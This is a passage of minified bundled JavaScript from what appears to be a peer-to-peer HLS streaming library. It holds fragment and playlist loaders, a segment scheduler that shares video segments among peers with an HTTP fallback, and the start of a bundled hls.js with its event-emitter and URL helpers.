            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = r(1),
            u = i(l),
            c = r(5),
            d = r(2),
            f = r(12),
            h = i(f),
            g = r(4),
            p = r(9),
            v = i(p),
            m = function(e) {
                function t(e) { n(this, t); var r = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    r.logger = e.logger; var i = window.__p2p_loader__,
                        s = i.scheduler,
                        o = i.fetcher,
                        l = i.p2pBlackList; return r.isHlsV0 = e.isHlsV0, r.bufMgr = e.bufMgr, r.xhrLoader = new e.loader(e), r.p2pEnabled = e.p2pEnabled, r.isLive = e.live, r.scheduler = s, r.fetcher = o, r.segmentId = e.segmentId, r.blockTypes = l, r.forbidden = o.forbidden, r.multiBitrate = r.scheduler instanceof h.default, r.stats = r.xhrLoader.stats || (0, c.createLoadStats)(), r.waitTimer = null, r } return s(t, e), o(t, [{ key: "destroy", value: function() { this.xhrLoader.destroy() } }, { key: "abort", value: function() { this.xhrLoader.abort() } }, { key: "load", value: function(e, t, r) { var i = this,
                            n = this.logger,
                            a = this.scheduler,
                            s = e.frag;
                        this.isHlsV0 || (s.stats = this.stats); var o = e.frag.segId; if (!o) { var l = void 0;
                            e.rangeEnd && (l = "bytes=" + e.rangeStart + "-" + (e.rangeEnd - 1)), o = e.frag.segId = this.segmentId(s.baseurl, s.sn, s.url, l) } if ((0, c.isBlockType)(s.url, this.blockTypes)) { n.info("HTTP load blockType " + s.url), e.frag.loadByHTTP = !0; var u = r.onSuccess; return r.onSuccess = function(e, t, r) { n.info("HTTP load time " + (t.tload - t.trequest) + "ms"), u(e, t, r) }, this.xhrLoader.load(e, t, r) } if (!this.forbidden)
                            if (t.maxRetry = 2, this.p2pEnabled && this.bufMgr.hasSegOfId(o)) { n.info("bufMgr found seg sn " + s.sn + " segId " + o); var f = this.bufMgr.getSegById(o),
                                    h = d.Buffer.from(f.data),
                                    p = new d.Buffer(f.data.byteLength);
                                h.copy(p); var m = new Uint8Array(p).buffer,
                                    y = { url: e.url, data: m };
                                (0, c.updateLoadStats)(this.stats, f.size), s.loaded = f.size, s.loadByP2P = !0, e.frag.fromPeerId = f.fromPeerId, (0, g.queueMicrotask)(function() {!i.isHlsV0 && r.onProgress && r.onProgress(i.stats, e, y.data), r.onSuccess(y, i.stats, e) }) } else if (this.p2pEnabled && a.hasAndSetTargetPeer(this.multiBitrate ? s.segId : s.sn)) this.loadFragByP2p(e, t, r, o);
                        else { var b = a.mBufferedDuration; if (n.info("fragLoader load " + o + " at " + s.sn + " level " + s.level + " buffered " + b), this.isLive && a.hasIdlePeers && b > 6.5 && a.shouldWaitForNextSeg()) { var _ = b - 6.5;
                                _ > 5.5 && (_ = 5.5); var E = function n(l) { o === l && (a.off(v.default.SCH_DCHAVE, n), clearTimeout(i.waitTimer), a.hasAndSetTargetPeer(i.multiBitrate ? s.segId : s.sn) ? i.loadFragByP2p(e, t, r, o) : i.loadFragByHttp(e, t, r, o)) };
                                n.info("wait peer have for " + _ + "s"), a.on(v.default.SCH_DCHAVE, E), this.waitTimer = setTimeout(function() { a.notifyAllPeers(s.sn, o), i.loadFragByHttp(e, t, r, o), a.off(v.default.SCH_DCHAVE, E) }, 1e3 * _) } else this.loadFragByHttp(e, t, r, o) } } }, { key: "loadFragByHttp", value: function(e, t, r, i) { var n = this;
                        this.scheduler.isReceiver = !1; var a = this.logger,
                            s = e.frag,
                            o = r.onSuccess;
                        r.onSuccess = function(e, t, r) { if (!n.bufMgr.hasSegOfId(i)) { var l = d.Buffer.from(e.data),
                                    u = new d.Buffer(e.data.byteLength);
                                l.copy(u); var c = new d.Segment(s.sn, i, u, n.fetcher.peerId);
                                n.bufMgr.putSeg(c) }
                            n.fetcher.reportFlow(t.total), a.info("HTTP loaded " + i + " time " + (t.tload - t.trequest) + "ms"), o(e, t, r) }, e.frag.loadByHTTP = !0, this.xhrLoader.load(e, t, r) } }, { key: "loadFragByP2p", value: function(e, t, r, i) { var n = this,
                            a = this.logger,
                            s = e.frag;
                        this.scheduler.load(e, t, r); var o = r.onTimeout;
                        r.onTimeout = function(e, i) { a.warn("P2P timeout switched to HTTP load " + s.relurl + " at " + s.sn), n.xhrLoader.load(i, t, r), r.onTimeout = o }; var l = r.onSuccess;
                        r.onSuccess = function(e, t, o) { if (r.onSuccess = function() { a.warn("p2p loaded " + s.sn + ", http ignore") }, !n.bufMgr.hasSegOfId(i)) { var u = d.Buffer.from(e.data),
                                    c = new d.Buffer(e.data.byteLength);
                                u.copy(c); var f = new d.Segment(s.sn, i, c, s.fromPeerId || n.fetcher.peerId);
                                n.bufMgr.putSeg(f) }
                            s.loadByP2P || n.fetcher.reportFlow(t.total), s.loaded = t.loaded, a.info((s.loadByP2P ? "P2P" : "HTTP") + " loaded segment id " + i), !n.isHlsV0 && r.onProgress && r.onProgress(t, o, e.data), l(e, t, o) } } }]), t }(u.default);
        t.default = m, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = r(1),
            u = i(l),
            c = r(12),
            d = i(c),
            f = r(4),
            h = r(5),
            g = function(e) {
                function t(e) { n(this, t); var r = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    r.logger = e.logger; var i = window.__p2p_loader__.scheduler; return r.isHlsV0 = e.isHlsV0, r.xhrLoader = new e.loader(e), r.p2pEnabled = e.p2pEnabled, r.scheduler = i, r.multiBitrate = r.scheduler instanceof d.default, r.stats = r.xhrLoader.stats || (0, h.createLoadStats)(), r } return s(t, e), o(t, [{ key: "destroy", value: function() { this.xhrLoader.destroy() } }, { key: "abort", value: function() { this.xhrLoader.abort() } }, { key: "load", value: function(e, t, r) { var i = this,
                            n = this.logger,
                            a = e.url,
                            s = a.split("?")[0]; if (this.scheduler.playlistInfo.has(s)) { var o = this.scheduler.getPlaylistFromPeer(s); if (o && o.data) { var l = o.data;
                                n.info("got playlist from peer length " + l.length), (0, h.updateLoadStats)(this.stats, l.length); var u = { url: a, data: l }; return void(0, f.queueMicrotask)(function() { r.onSuccess(u, i.stats, e) }) } }
                        this.xhrLoader.load(e, t, r); var c = r.onSuccess;
                        r.onSuccess = function(e, t, r) { i.scheduler.broadcastPlaylist(s, e.data), c(e, t, r) } } }]), t }(u.default);
        t.default = g, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function a(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function s(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function o(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            u = function e(t, r, i) { null === t && (t = Function.prototype); var n = Object.getOwnPropertyDescriptor(t, r); if (void 0 === n) { var a = Object.getPrototypeOf(t); return null === a ? void 0 : e(a, r, i) } if ("value" in n) return n.value; var s = n.get; if (void 0 !== s) return s.call(i) },
            c = r(2),
            d = r(9),
            f = i(d),
            h = r(0),
            g = r(20),
            p = i(g),
            v = r(38),
            m = i(v),
            y = r(5),
            b = r(4),
            _ = 150,
            E = 3,
            S = function(e) {
                function t(e, r) { a(this, t); var i = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, r)); return i.logger.info("use SnScheduler"), i.sequential = !0, i.currPlaySN = 0, i.currLostSN = -1, i.nextLostSN = -1, i.checkTimer = null, i.loadedPeerNum = 0, i.config.live ? i.maxPrefetchCount = E : (i.maxPrefetchCount = _, i.startCheckPeersTimer()), i.waitForPeer = r.waitForPeer || !1, i.waitingPeers = 0, i.waitForPeer && (i.waitForPeerTimer = setTimeout(function() { i.waitForPeer = !1 }, 1e3 * (r.waitForPeerTimeout + 2))), i.estimatedSize = 1e6, i } return o(t, e), l(t, [{ key: "startCheckPeersTimer", value: function() { var e = this,
                            t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 1;
                        this.logger.info("loaded peers " + this.loadedPeerNum + " next checkDelay is " + t), this.loadedPeerNum = 0, this.checkTimer || (this.checkTimer = setTimeout(function() { e.checkPeers(), e.checkTimer = null, e.startCheckPeersTimer((0, h.calCheckPeersDelay)(e.loadedPeerNum)) }, 1e3 * t)) } }, { key: "notifySubscribeLevel", value: function() { var e = this;
                        this.subscribers.forEach(function(t) { var r = e.peerManager.getPeer(t);
                            r && r.sendSubscribeLevel(e.subscribeLevel) }) } }, { key: "updatePlaySN", value: function(e) { this.currPlaySN = e } }, { key: "checkPeers", value: function() { var e = this.logger,
                            t = this.config; if (!this.waitForPeer && !(this.nextLostSN >= 0 && this.nextLostSN >= this.currPlaySN - 10) && this.hasPeers) { if (this.mBufferedDuration < this.allowP2pLimit) return void e.warn("low buffer time, skip prefetch"); var r = this.peerManager.getPeersOrderByWeight(); if (0 !== r.length) { var i = [],
                                    a = t.prefetchNum,
                                    s = t.endSN,
                                    o = 0,
                                    l = this.loadingSN + 1,
                                    u = t.live; if (!u) { var c = Math.min.apply(Math, n(r.filter(function(e) { return e.endSN >= l }).map(function(e) { return e ? e.startSN : 1 / 0 }))); if (!isFinite(c)) return;
                                    l < c && (l = c) } for (; i.length <= a && i.length < r.length && o < this.maxPrefetchCount;) { if (!u && l > s) return; if (this.bitset.has(l)) l++;
                                    else { if (l !== this.loadingSN && this.bitCounts.has(l) && !this.requestingMap.has(l)) { var d = !0,
                                                f = !1,
                                                h = void 0; try { for (var g, p = r[Symbol.iterator](); !(d = (g = p.next()).done); d = !0) { var v = g.value; if (!i.includes(v) && v.bitset.has(l)) { v.requestDataBySN(l, !1), e.info("request prefetch " + l + " from peer " + v.remotePeerId + " downloadNum " + v.downloadNum), i.push(v), this.requestingMap.set(l, v.remotePeerId); break } } } catch (e) { f = !0, h = e } finally { try {!d && p.return && p.return() } finally { if (f) throw h } } }
                                        o++, l++ } }
                                this.loadedPeerNum = i.length } } } }, { key: "addPeer", value: function(e) { if (u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "addPeer", this).call(this, e), this.waitForPeer && this.criticalSeg) { var r = this.criticalSeg.segId,
                                i = this.criticalSeg.sn,
                                n = e.remotePeerId,
                                a = this.requestingMap;
                            a.checkIfPeerUnknown(i) && (e.bitset.has(i) ? (this.logger.info("found initial seg " + i + " from peer " + n), a.set(i, n), e.requestDataById(r, i, !0)) : this.waitingPeers === this.peersNum && this.criticaltimeout()) } } }, { key: "deletePeer", value: function(e) { if (u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "deletePeer", this).call(this, e), this.subscribeMode && e.remotePeerId === this.subscribeParent.remotePeerId) { var r = "subscribe parent is leaved";
                            this.logger.warn(r), this._unsubscribe(r), this.criticaltimeout() } } }, { key: "load", value: function(e, t, r) { this.isReceiver = !0; var i = this.logger,
                            a = this.config;
                        this.context = e; var s = e.frag,
                            o = s.segId,
                            l = s.sn;
                        this.callbacks = r, this.stats = (0, y.createLoadStats)(), this.criticalSeg = { sn: l, segId: o }, this.targetPeers.length > 0 ? this.criticalSeg.targetPeers = [].concat(n(this.targetPeers.map(function(e) { return e.remotePeerId }))) : this.criticalSeg.targetPeers = [].concat(n(this.requestingMap.getAllPeerIds(l))); var u = this.mBufferedDuration - a.httpLoadTime; if (this.waitForPeer ? u = a.waitForPeerTimeout : u > this.dcDownloadTimeout && (u = this.dcDownloadTimeout), this.requestingMap.has(l)) i.info("wait for criticalSeg segId " + o + " at " + l + " timeout " + u);
                        else { var c = !0,
                                d = !1,
                                f = void 0; try { for (var h, g = this.targetPeers[Symbol.iterator](); !(c = (h = g.next()).done); c = !0) { var p = h.value;
                                    p.downloading || (i.info("request criticalSeg segId " + o + " at " + l + " from " + p.remotePeerId + " timeout " + u), p.requestDataById(o, l, !0)), this.requestingMap.set(l, p.remotePeerId) } } catch (e) { d = !0, f = e } finally { try {!c && g.return && g.return() } finally { if (d) throw f } } }
                        this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this, !0), 1e3 * u), this.targetPeers = [] } }, { key: "onBufferManagerSegAdded", value: function(e) { this._sendSegmentToSubscribers(e) } }, { key: "onBufferManagerLost", value: function(e, t, r) { this.currLostSN = e, r && (this.nextLostSN = r), this.bitset.delete(e), this.bitCounts.delete(e) } }, { key: "destroy", value: function() { u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "destroy", this).call(this), clearTimeout(this.checkTimer), clearTimeout(this.waitForPeerTimer), this.logger.warn("destroy SnScheduler") } }, { key: "_setupDC", value: function(e) { var r = this;
                        u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e); var i = this.logger,
                            n = this.config;
                        e.on(f.default.DC_HAVE, function(t) { if (t.sn && e.bitset && t.sn && t.sn >= 0) { var i = t.sn; if (e.bitset.add(i), r.bitset.has(i) || r._increBitCounts(i), n.live) { var a = i - 20;
                                    a > 0 && e.bitset.delete(a) }
                                r.emit(f.default.SCH_DCHAVE, t.seg_id), (0, b.queueMicrotask)(function() {!n.live || r.criticalSeg || r.subscribeMode || r.checkPeers() }) } }).on(f.default.DC_LOST, function(t) { if (t.sn && e.bitset) { var i = t.sn;
                                e.bitset.delete(i), r._decreBitCounts(i) } }).on(f.default.DC_PIECE, function(t) { r.subscribers.length > 0 && t.sn > r.subscriberEdgeSN && (r._sendPieceToSubscribers(t.sn, t.seg_id, !1, !1, t), e.addDownloadListener(function(e, t, i, n, a) { i ? r._sendPieceToSubscribers(e, t, !1, !0, n) : r._sendPieceToSubscribers(e, t, !0, !1, n, a) }), r.subscriberEdgeSN = t.sn), t.ext && t.ext.incompletes >= 3 || r.notifyAllPeers(t.sn, t.seg_id) }).on(f.default.DC_PIECE_NOT_FOUND, function(t) { var a = t.sn;
                            r.criticalSeg && r.criticalSeg.sn === a && (1 === r.criticalSeg.targetPeers.length ? (clearTimeout(r.criticaltimeouter), i.info("DC_PIECE_NOT_FOUND " + a), r.criticalSeg = null, r.callbacks.onTimeout(r.stats, r.context, null)) : r.criticalSeg.targetPeers = r.criticalSeg.targetPeers.filter(function(t) { return t !== e.remotePeerId })), e.bitset.delete(a), n.live && e.resetContinuousHits(), r.requestingMap.delete(a), r._decreBitCounts(a), e.checkIfNeedChoke() }).on(f.default.DC_RESPONSE, function(n, a) { var s = r.config,
                                o = n.segId,
                                l = n.sn,
                                d = n.data,
                                f = r.criticalSeg && r.criticalSeg.segId === o; if (s.validateSegment(o, d))
                                if (r.notifyAllPeers(l, o), u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "reportDCTraffic", r).call(r, l, n.size, a), f) { i.info("receive criticalSeg seg_id " + o), clearTimeout(r.criticaltimeouter), r.criticaltimeouter = null, e.miss = 0; var h = r.stats;
                                    h.tfirst = h.loading.first = Math.max(h.trequest, performance.now()), h.tload = h.loading.end = h.tfirst, h.loaded = h.total = d.byteLength, r.criticalSeg = null; var g = r.context.frag;
                                    g.fromPeerId = e.remotePeerId, g.loadByP2P = !0, r.callbacks.onSuccess({ data: d, url: r.context.url }, h, r.context), e.increContinuousHits(), s.maxSubscribeLevel && s.live && !r.subscribeMode && e.continuousHits > 7 && e.sendSubscribe() } else { if (r.bitset.has(l)) return; var p = new c.Segment(l, o, d, e.remotePeerId);
                                    r.bufMgr.putSeg(p), r.updateLoaded(l) }
                            else i.warn("segment " + o + " validate failed"), f && (clearTimeout(r.criticaltimeouter), r.criticaltimeout());
                            r.requestingMap.delete(l), !s.live || r.criticalSeg || r.subscribeMode || r.checkPeers() }).on(f.default.DC_REQUEST, function(t) { var n = t.sn;
                            r.isUploader = !0, r.subscribers.includes(e.remotePeerId) && (e.subscribeEdgeSN = n); var a = t.seg_id;
                            a || (a = r.bufMgr.getSegIdBySN(n)); var s = null; if (r.requestingMap.has(n) && (s = r.getPeerLoadedMore(n)), r.bufMgr.hasSegOfId(a)) { i.info("found seg from bufMgr"); var o = r.bufMgr.getSegById(a);
                                e.sendBuffer(o.sn, o.segId, o.data, { from: "SegmentFromCache" }) } else s && s.downloading && s.pieceMsg.sn === n ? (i.info("target had " + s.bufArr.length + " packets, wait for remain from upstream " + s.remotePeerId), e.sendPartialBuffer(s.pieceMsg, s.bufArr, { from: "WaitForPartial", incompletes: 1 }), function(e, t) { e.addDownloadListener(function(e, r, i, n, a) { i ? t.sendMsgPieceAbort(n) : t.send(n), a && (t.uploading = !1) }) }(s, e)) : n >= r.loadingSN ? (i.info("peer request " + n + " wait for seg"), r.bufMgr.once("" + f.default.BM_ADDED_SN_ + n, function(t) { t ? (i.info("peer request notify seg " + t.sn), e.sendBuffer(t.sn, t.segId, t.data, { from: "NotifySegment" })) : e.sendPieceNotFound(n, a) })) : e.sendPieceNotFound(n, a) }).on(f.default.DC_SUBSCRIBE, function() { if (r.config.live) { var t = r.subscribers.length,
                                    n = r.config.maxSubscribeLevel; if (0 === n) e.sendSubscribeReject("subscribe disabled");
                                else if (t >= 25) e.sendSubscribeReject("too many subscribers");
                                else if (r.subscribeLevel >= n) e.sendSubscribeReject("subscribe level reach " + r.subscribeLevel);
                                else if (r.subscribers.indexOf(e.remotePeerId) >= 0) e.sendSubscribeReject("subscriber already exist");
                                else { if (t >= 4) { var a = []; if (r.subscribers.forEach(function(e) { var t = r.peerManager.getPeer(e).uploadSpeed;
                                                t && a.push(t) }), !m.default.evaluatePeersSpeed(a, r.estimatedSize)) return void e.sendSubscribeReject("Insufficient upload capability") }
                                    r.subscribers.push(e.remotePeerId), i.info("subscribers add " + e.remotePeerId), e.sendSubscribeAccept(r.subscribeLevel) } } }).on(f.default.DC_UNSUBSCRIBE, function(t) { var n = r.subscribers.indexOf(e.remotePeerId); - 1 !== n && (i.info("subscribers remove " + e.remotePeerId + " reason " + t.reason), r.subscribers.splice(n, 1)) }).on(f.default.DC_SUBSCRIBE_ACCEPT, function(t) { if (!r.subscribeMode) { var i = t.level || 0;
                                r.subscribeMode = !0, r.subscribeLevel = i + 1, r.subscribeParent = e, r.notifySubscribeLevel() } }).on(f.default.DC_SUBSCRIBE_REJECT, function(t) { i.warn("subscribe rejected, reason " + t.reason), e.resetContinuousHits() }).on(f.default.DC_SUBSCRIBE_LEVEL, function(e) { if (r.subscribeMode) { var t = e.level || 0;
                                r.subscribeLevel = t + 1, i.info("set subscribe level to " + r.subscribeLevel), r.notifySubscribeLevel() } }) } }, { key: "_setupEngine", value: function() { var e = this;
                        this.engine.on(f.default.FRAG_LOADING, function(t, r, i) { e.loadingSN = t, e.loadingSegId = r, i && e.notifyAllPeers(t, r) }).on(f.default.FRAG_LOADED, function(t, r, i, n) { e.config.live && (e.estimatedSize = i), e.updateLoaded(t) }).on(f.default.FRAG_CHANGED, function(t, r) { e.updatePlaySN(t) }) } }, { key: "notifyPeersLoaded", value: function(e) { this.logger.info("notifyPeersLoaded " + e), this.waitForPeer && (0 === e ? this.criticaltimeout() : this.waitingPeers = e) } }, { key: "_unsubscribe", value: function(e) { this.logger.warn("unsubscribe to " + this.subscribeParent.remotePeerId), this.subscribeParent.sendUnsubscribe(e), this.subscribeParent = null, this.subscribeLevel = 0, this.subscribeMode = !1, this.notifySubscribeLevel() } }, { key: "_sendSegmentToSubscribers", value: function(e) { var t = this,
                            r = e.sn,
                            i = e.segId,
                            n = e.data;
                        this.subscribers = this.subscribers.filter(function(e) { var a = t.peerManager.getPeer(e); return a ? !(!a.uploading && !a.bitset.has(r)) || (t.logger.info("send seg " + i + " to subscriber " + e), a.uploading = !0, a.sendBuffer(r, i, n, { from: "SegmentToSubscribers" }), a.bitset.add(r), !0) : (t.logger.info("subscribers remove " + e), !1) }) } }, { key: "_sendPieceToSubscribers", value: function(e, t, r, i, n, a) { var s = this;
                        this.subscribers = this.subscribers.filter(function(t) { var o = s.peerManager.getPeer(t); if (o) { if (r && e === o.pieceMsg.sn) o.send(n), a && (o.uploading = !1, o.bitset.add(e));
                                else if (!r)
                                    if (i) o.sendMsgPieceAbort(n);
                                    else { if (o.uploading || e <= o.subscribeEdgeSN) return !0;
                                        o.subscribeEdgeSN = e, o.uploading = !0, o.pieceMsg = n, s.logger.info("downstream msg " + JSON.stringify(n) + " to subscriber " + t), o.sendMsgPiece(n, { from: "PieceToSubscribers", incompletes: 1 }) }
                                return !0 } return s.logger.info("subscribers remove " + t), !1 }) } }]), t }(p.default);
        t.default = S, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }
        Object.defineProperty(t, "__esModule", { value: !0 }); var n = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            a = function() {
                function e() { i(this, e) } return n(e, null, [{ key: "evaluatePeersSpeed", value: function(e, t) { var r = t / 3500,
                            i = r,
                            n = 1.05 * r,
                            a = 0; return e.forEach(function(e) { if (e) { if (e < i) return !1;
                                a += e } }), a / e.length >= n } }]), e }();
        t.default = a, e.exports = t.default }, function(e, t, r) { "undefined" != typeof window && function(t, r) { e.exports = r() }(0, function() { return function(e) {
                function t(i) { if (r[i]) return r[i].exports; var n = r[i] = { i: i, l: !1, exports: {} }; return e[i].call(n.exports, n, n.exports, t), n.l = !0, n.exports } var r = {}; return t.m = e, t.c = r, t.d = function(e, r, i) { t.o(e, r) || Object.defineProperty(e, r, { enumerable: !0, get: i }) }, t.r = function(e) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 }) }, t.t = function(e, r) { if (1 & r && (e = t(e)), 8 & r) return e; if (4 & r && "object" == typeof e && e && e.__esModule) return e; var i = Object.create(null); if (t.r(i), Object.defineProperty(i, "default", { enumerable: !0, value: e }), 2 & r && "string" != typeof e)
                        for (var n in e) t.d(i, n, function(t) { return e[t] }.bind(null, n)); return i }, t.n = function(e) { var r = e && e.__esModule ? function() { return e.default } : function() { return e }; return t.d(r, "a", r), r }, t.o = function(e, t) { return Object.prototype.hasOwnProperty.call(e, t) }, t.p = "/dist/", t(t.s = "./src/hls.ts") }({ "./node_modules/eventemitter3/index.js": function(e, t, r) { "use strict";

                    function i() {}

                    function n(e, t, r) { this.fn = e, this.context = t, this.once = r || !1 }

                    function a(e, t, r, i, a) { if ("function" != typeof r) throw new TypeError("The listener must be a function"); var s = new n(r, i || e, a),
                            o = u ? u + t : t; return e._events[o] ? e._events[o].fn ? e._events[o] = [e._events[o], s] : e._events[o].push(s) : (e._events[o] = s, e._eventsCount++), e }

                    function s(e, t) { 0 == --e._eventsCount ? e._events = new i : delete e._events[t] }

                    function o() { this._events = new i, this._eventsCount = 0 } var l = Object.prototype.hasOwnProperty,
                        u = "~";
                    Object.create && (i.prototype = Object.create(null), (new i).__proto__ || (u = !1)), o.prototype.eventNames = function() { var e, t, r = []; if (0 === this._eventsCount) return r; for (t in e = this._events) l.call(e, t) && r.push(u ? t.slice(1) : t); return Object.getOwnPropertySymbols ? r.concat(Object.getOwnPropertySymbols(e)) : r }, o.prototype.listeners = function(e) { var t = u ? u + e : e,
                            r = this._events[t]; if (!r) return []; if (r.fn) return [r.fn]; for (var i = 0, n = r.length, a = new Array(n); i < n; i++) a[i] = r[i].fn; return a }, o.prototype.listenerCount = function(e) { var t = u ? u + e : e,
                            r = this._events[t]; return r ? r.fn ? 1 : r.length : 0 }, o.prototype.emit = function(e, t, r, i, n, a) { var s = u ? u + e : e; if (!this._events[s]) return !1; var o, l, c = this._events[s],
                            d = arguments.length; if (c.fn) { switch (c.once && this.removeListener(e, c.fn, void 0, !0), d) {
                                case 1:
                                    return c.fn.call(c.context), !0;
                                case 2:
                                    return c.fn.call(c.context, t), !0;
                                case 3:
                                    return c.fn.call(c.context, t, r), !0;
                                case 4:
                                    return c.fn.call(c.context, t, r, i), !0;
                                case 5:
                                    return c.fn.call(c.context, t, r, i, n), !0;
                                case 6:
                                    return c.fn.call(c.context, t, r, i, n, a), !0 } for (l = 1, o = new Array(d - 1); l < d; l++) o[l - 1] = arguments[l];
                            c.fn.apply(c.context, o) } else { var f, h = c.length; for (l = 0; l < h; l++) switch (c[l].once && this.removeListener(e, c[l].fn, void 0, !0), d) {
                                case 1:
                                    c[l].fn.call(c[l].context); break;
                                case 2:
                                    c[l].fn.call(c[l].context, t); break;
                                case 3:
                                    c[l].fn.call(c[l].context, t, r); break;
                                case 4:
                                    c[l].fn.call(c[l].context, t, r, i); break;
                                default:
                                    if (!o)
                                        for (f = 1, o = new Array(d - 1); f < d; f++) o[f - 1] = arguments[f];
                                    c[l].fn.apply(c[l].context, o) } } return !0 }, o.prototype.on = function(e, t, r) { return a(this, e, t, r, !1) }, o.prototype.once = function(e, t, r) { return a(this, e, t, r, !0) }, o.prototype.removeListener = function(e, t, r, i) { var n = u ? u + e : e; if (!this._events[n]) return this; if (!t) return s(this, n), this; var a = this._events[n]; if (a.fn) a.fn !== t || i && !a.once || r && a.context !== r || s(this, n);
                        else { for (var o = 0, l = [], c = a.length; o < c; o++)(a[o].fn !== t || i && !a[o].once || r && a[o].context !== r) && l.push(a[o]);
                            l.length ? this._events[n] = 1 === l.length ? l[0] : l : s(this, n) } return this }, o.prototype.removeAllListeners = function(e) { var t; return e ? (t = u ? u + e : e, this._events[t] && s(this, t)) : (this._events = new i, this._eventsCount = 0), this }, o.prototype.off = o.prototype.removeListener, o.prototype.addListener = o.prototype.on, o.prefixed = u, o.EventEmitter = o, e.exports = o }, "./node_modules/url-toolkit/src/url-toolkit.js": function(e, t, r) {! function(t) { var r = /^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/,
                            i = /^([^\/?#]*)(.*)$/,
                            n = /(?:\/|^)\.(?=\/)/g,
                            a = /(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,
                            s = { buildAbsoluteURL: function(e, t, r) { if (r = r || {}, e = e.trim(), !(t = t.trim())) { if (!r.alwaysNormalize) return e; var n = s.parseURL(e); if (!n) throw new Error("Error trying to parse base URL."); return n.path = s.normalizePath(n.path), s.buildURLFromParts(n) } var a = s.parseURL(t); if (!a) throw new Error("Error trying to parse relative URL."); if (a.scheme) return r.alwaysNormalize ? (a.path = s.normalizePath(a.path), s.buildURLFromParts(a)) : t; var o = s.parseURL(e); if (!o) throw new Error("Error trying to parse base URL."); if (!o.netLoc && o.path && "/" !== o.path[0]) { var l = i.exec(o.path);
                                        o.netLoc = l[1], o.path = l[2] }
                                    o.netLoc && !o.path && (o.path = "/"); var u = { scheme: o.scheme, netLoc: a.netLoc, path: null, params: a.params, query: a.query, fragment: a.fragment }; if (!a.netLoc && (u.netLoc = o.netLoc, "/" !== a.path[0]))
                                        if (a.path) { var c = o.path,
                                                d = c.substring(0, c.lastIndexOf("/") + 1) + a.path;
                                            u.path = s.normalizePath(d) } else u.path = o.path, a.params || (u.params = o.params, a.query || (u.query = o.query));
                                    return null === u.path && (u.path = r.alwaysNormalize ? s.normalizePath(a.path) : a.path), s.buildURLFromParts(u) }, parseURL: function(e) { var t = r.exec(e); return t ? { scheme: t[1] || "", netLoc: t[2] || "", path: t[3] || "", params: t[4] || "", query: t[5] || "", fragment: t[6] || "" } : null }, normalizePath: function(e) { for (e = e.split("").reverse().join("").replace(n, ""); e.length !== (e = e.replace(a, "")).length;); return e.split("").reverse().join("") }, buildURLFromParts: function(e) { return e.scheme + e.netLoc + e.path + e.params + e.query + e.fragment } };
                        e.exports = s }() }, "./node_modules/webworkify-webpack/index.js": function(e, t, r) {
